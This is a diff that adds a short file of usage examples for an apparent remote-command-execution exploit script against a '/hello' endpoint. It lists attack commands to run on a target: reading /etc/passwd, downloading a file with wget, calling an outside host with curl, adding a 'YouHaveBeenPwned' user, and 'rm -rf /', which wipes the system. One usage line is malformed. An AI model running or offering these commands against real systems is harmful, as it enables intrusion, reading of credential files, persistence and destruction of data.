@@ -1,0 +1,10 @@
+Examples of commands that can be executed to exploit the vulnerability
+.
+python http://target-ip/hello "command"
+python exploit.py http://target-ip/hello "ls -la"
+python exploit.py http://target-ip/hello "cat /etc/passwd"
+python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
+python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
+python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
+python exploit.py http://target-ip/hello "ls -la"
+python exploit.py http://target-ip/hello "rm -rf /"
